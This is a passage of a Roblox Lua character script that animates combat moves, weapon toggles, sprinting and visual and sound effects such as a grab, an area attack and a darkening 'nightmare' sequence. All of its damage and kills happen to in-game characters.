							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(90), RAD(-45), RAD(45)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.2*SIZE, 0.5*SIZE, -1*SIZE) * ANGLES(RAD(0), RAD(0), RAD(90)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -0.5*SIZE, -0.5*SIZE) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -1*SIZE, -0.01*SIZE) * ANGLES(RAD(-45), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
						end
						for i=0,0.1, 0.1 / Animation_Speed do
							Swait()
							turnto(Mouse.Hit.p)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0*SIZE, 0*SIZE, 0*SIZE) * ANGLES(RAD(0), RAD(0), RAD(75)), 0.5)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0*SIZE, 0*SIZE, 0*SIZE + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(-75)), 0.5)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5*SIZE, 0.5*SIZE, 0*SIZE) * ANGLES(RAD(90), RAD(-45), RAD(0)) * RIGHTSHOULDERC0, 0.5)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5*SIZE, 0.5*SIZE, -1*SIZE) * ANGLES(RAD(90), RAD(0), RAD(75)) * LEFTSHOULDERC0, 0.5)
							RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -1*SIZE, -0.01*SIZE) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -1*SIZE, -0.01*SIZE) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5)
						end
						local SOUND = CreateSound("rbxasset://sounds/swordlunge.wav", Torso, 5, 0.6)
						SOUND.SoundId = "rbxasset://sounds/swordlunge.wav"
						CreateSound(62339698, Torso, 10, 0.4)
						ApplyAoE(RootPart.Position,55)
						ShakeCam(3,25)
						WACKYEFFECT({Time = 25, EffectType = "Block", Size = VT(5,5,5), Size2 = VT(100,100,100)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0,1)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-4,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/100,100/100), RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0,1)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-4,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/100,100/100), RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0,1)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-4,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/100,100/100), RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						STOPPP = true
						for i=0, 1, 0.1 / Animation_Speed do
							Swait()
							turnto(Mouse.Hit.p)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0*SIZE, 0*SIZE, 0*SIZE) * ANGLES(RAD(0), RAD(0), RAD(75)), 0.5)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0*SIZE, 0*SIZE, 0*SIZE + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(-75)), 0.5)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1*SIZE, 0.5*SIZE, -1*SIZE) * ANGLES(RAD(90), RAD(0), RAD(-75)) * RIGHTSHOULDERC0, 0.5)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5*SIZE, 0.5*SIZE, -1*SIZE) * ANGLES(RAD(90), RAD(0), RAD(75)) * LEFTSHOULDERC0, 0.5)
							RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -1*SIZE, -0.01*SIZE) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -1*SIZE, -0.01*SIZE) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5)
						end
						PLAYANIMS = true
						ATTACK = false
						Rooted = false
					end



					function Grab()
						local TARGET = Mouse.Target
						if TARGET ~= nil and TARGET.Parent:FindFirstChildOfClass("Humanoid") then
							do
								local HUM = TARGET.Parent:FindFirstChildOfClass("Humanoid")
								local ROOT = GetRoot(HUM.Parent, true)
								local FOE = ROOT.Parent
								local HED = FOE:FindFirstChild("Head")
								local TORS = FOE:FindFirstChild("Torso") or FOE:FindFirstChild("UpperTorso")
								Rooted = true
								turnto(TORS.Position)
								if ROOT and HUM.Health > 0 then   
									ATTACK = true	
									coroutine.resume(coroutine.create(function()
										repeat
											Swait()
											WACKYEFFECT2({
												Time = 12,
												EffectType = "Sphere",
												Size = VT(5, 5, 5)/10,
												Size2 = VT(0, 0, 250)/10,
												Transparency = 0,
												Transparency2 = 1,
												CFrame = CF(ROOT.Position) * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360))),
												MoveToPos = nil,
												RotationX = 0,
												RotationY = 0,
												RotationZ = 0,
												Material = "Neon",
												Color = C3(1,0,0),
												SoundID = 220834019,
												SoundPitch = 2,
												SoundVolume = .5,
												UseBoomerangMath = true,
												Boomerang = 50,
												SizeBoomerang = 100
											})
											WACKYEFFECT2({Time = 25, EffectType = "Box", Size = VT(2,0,2)/3, Size2 = VT(6,7.5,6)/3, Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame * ANGLES(RAD(MATHR(-360,360)), RAD(MATHR(-360,360)), RAD(MATHR(-360,360))), MoveToPos = RightArm.CFrame*CF(0,-1,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
											WACKYEFFECT2({
												Time = 15,
												EffectType = "Box",
												Size = TORS.Size * 1.2,
												Size2 = TORS.Size * 1.2,
												Transparency = 0.4,
												Transparency2 = 1,
												CFrame = TORS.CFrame,
												MoveToPos = nil,
												RotationX = 0,
												RotationY = 0,
												RotationZ = 0,
												Material = "Neon",
												Color = C3(1, 0, 0),
												SoundID = nil,
												SoundPitch = nil,
												SoundVolume = nil,
												UseBoomerangMath = false,
												Boomerang = 0,
												SizeBoomerang = 0
											})
											RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
											Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-2), RAD(-5), RAD(-85)) * ANGLES(RAD(0), RAD(0), RAD(-22 - 2.5 * SIN(SINE / 13))), 1 / Animation_Speed)
											RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.65, 1, 0) * ANGLES(RAD(120), RAD(0), RAD(90))* RIGHTSHOULDERC0, 0.15 / 3)
											LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.85, .5, 0) * ANGLES(RAD(0),RAD(0),RAD(-50)) * ANGLES(RAD(0),RAD(0),RAD(MATHR(-10,40))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
											RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
											LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(-60), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
										until ATTACK == false
									end))
									HUM.Health = .11111
									HUM:SetStateEnabled("Dead",true)
									local POS = ROOT.Position + VT(0, 15 * ROOT.Size.Z, 0)
									local grav = Instance.new("BodyPosition", ROOT)
									grav.D = 850
									grav.P = 4000
									grav.maxForce = VT(inf,inf,inf)
									grav.Position = POS
									wait(2)
									Kill(TARGET.Parent)
									ShakeCam(1,25)
									ATTACK = false
									Rooted = false
									Humanoid.CameraOffset = VT(0,0,0)
								end
							end	
						end
					end

					function Nightmare_Is_Coming()
						ATTACK = true
						CreateSound("459523898",RootPart,10,1,false)
						CreateSound("459523898",RootPart,10,1,false)
						CreateSound("223103466",RootPart,3,.8,false)
						CreateSound("3651185476",RootPart,10,1,false)
						CreateSound("3651185476",RootPart,10,1,false)
						CreateSound("3651185476",RootPart,10,1,false)
						CreateSound("3651185476",RootPart,10,1,false)
						local SCOLOR = Instance.new("ColorCorrectionEffect")
						SCOLOR.Brightness = 0
						SCOLOR.Contrast = 0
						SCOLOR.Saturation = 0
						SCOLOR.Name = "SpookyColor"
						SCOLOR.Parent = game:GetService('Lighting')
						for i=0, 11.5, 0.1 / Animation_Speed2 do
							Swait()
							Humanoid.CameraOffset = VT(MATHR(-500,500)/2.5,MATHR(-50,50)/2.5,MATHR(-500,500)/2.5)/30
							ApplyAoE(RootPart.Position,1e9)
							WACKYEFFECT2({
								Time = 12,
								EffectType = "Sphere",
								Size = VT(5, 5, 5)/10 * 25,
								Size2 = VT(0, 0, 250)/10 * 25,
								Transparency = 0,
								Transparency2 = 1,
								CFrame = CF(RootPart.Position) * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360))),
								MoveToPos = nil,
								RotationX = 0,
								RotationY = 0,
								RotationZ = 0,
								Material = "Neon",
								Color = C3(0,0,0),
								SoundID = nil,
								SoundPitch = 1,
								SoundVolume = 6,
								UseBoomerangMath = true,
								Boomerang = 0,
								SizeBoomerang = 0
							})
							WACKYEFFECT2({
								Time = 75 - i * 4,
								EffectType = "Box",
								Size = VT(0, 0, 0),
								Size2 = VT(5, 5, 5) + VT(i, i, i) * 55,
								Transparency = 0,
								Transparency2 = 1,
								CFrame = CF(RootPart.Position) * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360))),
								MoveToPos = nil,
								RotationX = 360,
								RotationY = 360,
								RotationZ = 360,
								Material = "Neon",
								Color = C3(0,0,0),
								SoundID = nil,
								SoundPitch = MATHR(8, 20) / 10,
								SoundVolume = 2,
								UseBoomerangMath = true,
								Boomerang = 25,
								SizeBoomerang = 100
							})
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-7), RAD(-10), RAD(27 - 2.5 * SIN(SINE / 13))) * ANGLES(RAD(0), RAD(0), RAD(-22 - 2.5 * SIN(SINE / 13))), 1 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, .5, 0) * ANGLES(RAD(0), RAD(0), RAD(15))* RIGHTSHOULDERC0, 0.15 / 3)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.65, .5, 0) *ANGLES(RAD(0),RAD(0 + .5 * COS(SINE / 12)),RAD(MATHR(-40,10))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
						end
						CreateSound("168513088",RootPart,10,1,false)
						CreateSound("168513088",RootPart,10,1,false)
						CreateSound("168513088",RootPart,10,1,false)
						CreateSound("168513088",RootPart,10,1,false)
						--
						CreateSound("231917744",RootPart,10,1,false)
						CreateSound("231917744",RootPart,10,1,false)
						CreateSound("231917744",RootPart,10,1,false)
						CreateSound("231917744",RootPart,10,1,false)
						game:GetService("Lighting").Brightness = 0
						game:GetService("Lighting").OutdoorAmbient = Color3.new(0,0,0)
						game:GetService("Lighting").ClockTime = 0
						Humanoid.HipHeight = 10
						local BLUR = Instance.new("BlurEffect")
						BLUR.Size = 0
						BLUR.Name = "Wasted"
						BLUR.Parent = game:GetService('Lighting')
						for i = 1,350 do
							Swait()
							SCOLOR.Brightness = 5-((i/10)*5)
							SCOLOR.Contrast = 4-((i/10)*4)
							SCOLOR.Saturation = 3-((i/10)*3)
							BLUR.Size = (i/30)*10
							ApplyAoE(RootPart.Position,1e9999)
							WACKYEFFECT2({
								Time = 75 - i * 4,
								EffectType = "Box",
								Size = VT(0, 0, 0),
								Size2 = VT(5, 5, 5) + VT(i, i, i) * 100,
								Transparency = 0,
								Transparency2 = 1,
								CFrame = CF(RootPart.Position) * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360))),
								MoveToPos = nil,
								RotationX = 360,
								RotationY = 360,
								RotationZ = 360,
								Material = "Neon",
								Color = C3(0,0,0),
								SoundID = 231917744,
								SoundPitch = MATHR(8, 20) / 10,
								SoundVolume = 3,
								UseBoomerangMath = true,
								Boomerang = 25,
								SizeBoomerang = 100
							})
							WACKYEFFECT2({EffectType = "Wave", Size = VT(0,5,0), Size2 = VT(i*12,5,i*12), Transparency = 0.6, Transparency2 = 1, CFrame = CF(RootPart.Position) * ANGLES(RAD(0), RAD(MATHR(0,360)), RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0.1, RotationY = 1, RotationZ = -0.1, Material = "Slate", Color = C3(0,0,0), SoundID = 528589382, SoundPitch = MATHR(5,15)/10, SoundVolume = 3, UseBoomerangMath = false, Boomerang = 0, SizeBoomerang = 0})
							WACKYEFFECT2({EffectType = "Sphere", Size = VT(0,5,0), Size2 = VT(i*12,5,i*12), Transparency = 0.6, Transparency2 = 1, CFrame = CF(RootPart.Position) * ANGLES(RAD(0), RAD(MATHR(0,360)), RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0.1, RotationY = 1, RotationZ = -0.1, Material = "Neon", Color = C3(1,0,0), SoundID = 528589382, SoundPitch = MATHR(5,15)/10, SoundVolume = 3, UseBoomerangMath = false, Boomerang = 0, SizeBoomerang = 0})
							WACKYEFFECT2({EffectType = "Slash", Size = VT(0,5,0), Size2 = VT(i*12,5,i*12), Transparency = 0.6, Transparency2 = 1, CFrame = CF(RootPart.Position) * ANGLES(RAD(0), RAD(MATHR(0,360)), RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0.1, RotationY = 1, RotationZ = -0.1, Material = "Neon", Color = C3(1,0,0), SoundID = 528589382, SoundPitch = MATHR(5,15)/10, SoundVolume = 3, UseBoomerangMath = false, Boomerang = 0, SizeBoomerang = 0})
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-7), RAD(-10), RAD(27 - 2.5 * SIN(SINE / 13))) * ANGLES(RAD(0), RAD(0), RAD(-22 - 2.5 * SIN(SINE / 13))), 1 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, .5, 0) * ANGLES(RAD(0), RAD(0), RAD(15))* RIGHTSHOULDERC0, 0.15 / 3)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.65, .5, 0) *ANGLES(RAD(0),RAD(0 + .5 * COS(SINE / 12)),RAD(MATHR(-40,10))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 + 0.01, -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-2), RAD(0), RAD(0)), 0.15 / Animation_Speed)
						end
						local SCOLORE = game:GetService('Lighting'):FindFirstChild("SpookyColor")
						if SCOLORE then
							spawn(function()
								for i = 1,20 do
									SCOLORE.Brightness = 0
									SCOLORE.Contrast = 0
									SCOLORE.Saturation = 0
								end
								SCOLORE:Destroy()
								SCOLOR:Destroy()  
							end)
						end	
						local BLURA = game:GetService('Lighting'):FindFirstChild("Wasted")
						if BLURA then
							spawn(function()
								for i = 1, 20 do
									BLURA.Size = 5-((i/30)*5)
									swait()
								end
								BLUR:Destroy()
								BLURA:Destroy() 
							end)
						end
						Humanoid.HipHeight = 0
						game:GetService("Lighting").ClockTime = 14
						game:GetService("Lighting").Brightness = 2
						ATTACK = false
						Humanoid.CameraOffset = VT(0,0,0)
					end

					function ToggleBlade()
						WACKYEFFECT({Time = 25,EffectType = "Block", Size = VT(0,0,0), Size2 = VT(25,25,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = 260435136, SoundPitch = 0.9, SoundVolume = 10})
						WACKYEFFECT({Time = 12.5,EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(0.25,0,0.25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Ring", Size = VT(0,0,0), Size2 = VT(1.25,2.5,2.5), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(25,0,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						if WEAPONEQUIPPED == false and GUNEQUIPPED == false and CANNONEQUIPPED == false then
							WEAPONEQUIPPED = true
						else
							WEAPONEQUIPPED = false
						end
					end

					function ToggleGun()
						WACKYEFFECT({Time = 25,EffectType = "Block", Size = VT(0,0,0), Size2 = VT(25,25,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = 260435136, SoundPitch = 0.9, SoundVolume = 10})
						WACKYEFFECT({Time = 12.5,EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(0.25,0,0.25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Ring", Size = VT(0,0,0), Size2 = VT(1.25,2.5,2.5), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(25,0,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						if GUNEQUIPPED == false and WEAPONEQUIPPED == false and CANNONEQUIPPED == false then
							GUNEQUIPPED = true
						else
							GUNEQUIPPED = false
						end
					end

					function ToggleCannon()
						WACKYEFFECT({Time = 25,EffectType = "Block", Size = VT(0,0,0), Size2 = VT(25,25,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = 260435136, SoundPitch = 0.9, SoundVolume = 10})
						WACKYEFFECT({Time = 12.5,EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(0.25,0,0.25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Ring", Size = VT(0,0,0), Size2 = VT(1.25,2.5,2.5), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						WACKYEFFECT({Time = 12.5,EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(25,0,25), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						if CANNONEQUIPPED == false and WEAPONEQUIPPED == false and GUNEQUIPPED == false then
							CANNONEQUIPPED = true
						else
							CANNONEQUIPPED = false
						end
					end

					function draw()
						repeat Swait()
							local a = Instance.new("Part",Effects)
							local mesh22 = Instance.new("SpecialMesh", a)
							mesh22.MeshId = Enum.MeshType.Sphere
							a.Name = "d r a w"
							a.Size = Vector3.new(2.5,0.01,2.5)
							a.CFrame = CFrame.new(Mouse.Hit.Position)
							a.Locked = true
							a.Anchored = true
							a.CanCollide = false
							a.Material = "Neon"
						until KEYHOLD == false
					end

					function Sprint()
						Speed = 70
						Animation_Speed = 5.0
						RUNNING = true
						Mouse.KeyUp:Connect(function(Key)
							if Key == "0" then
								Animation_Speed = 3.0
								Speed = 30
								RUNNING = false
							end
						end)
					end

					function TP()
						for _, v in pairs(game:GetService("Workspace"):GetChildren()) do
							if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v ~= Character then
								v:FindFirstChild("HumanoidRootPart").CFrame = Character:FindFirstChild("HumanoidRootPart").CFrame + Vector3.new(0,5,0)
								v:FindFirstChild("HumanoidRootPart").Anchored = true
							end
						end
						Slash()
					end

					function Combo()
						ATTACK = true
						Rooted = false
						local savespeed = Speed
						Speed = 12
						EQUIPPED = true
						local HIT2 = function()
							local HITS2 = {}
							local TOUCH2 = LeftArm.Touched:Connect(function(hit)
								if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
									local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
									local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
									if TORSO and HUM.Health > 0 then
										local PASS = true
										for i = 1, #HITS2 do
											if HITS2[i] == hit.Parent then
												PASS = false
											end
										end
										table.insert(HITS2,hit.Parent)
										if PASS == true then
											Kill(HUM.Parent)
										end
									end
								end
							end)
							return TOUCH2
						end
						local HIT = function()
							local HITS = {}
							local TOUCH = RightArm.Touched:Connect(function(hit)
								if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
									local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
									local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
									if TORSO and HUM.Health > 0 then
										local PASS = true
										for i = 1, #HITS do
											if HITS[i] == hit.Parent then
												PASS = false
											end
										end
										table.insert(HITS,hit.Parent)
										if PASS == true then
											Kill(HUM.Parent)
										end
									end
								end
							end)
							return TOUCH
						end
						if COMBO == 1 then
							for i=0, 0.35, 0.1 / Animation_Speed do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(5)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)  
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								end
							end
							CreateSound(1489705211,RightArm,MATHR(7,8),MATHR(8,13)/12,false)
							local TOUCHED = HIT()
							for i=0, 0.5, 0.1 / Animation_Speed do
								Swait()
								WACKYEFFECT2({EffectType = "Block", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = MATHR(1,360), RotationY = MATHR(1,360), RotationZ = MATHR(1,360), Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(-35)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(45)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.8, 0.5, -0.7) * ANGLES(RAD(0), RAD(0), RAD(-90)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / Animation_Speed)
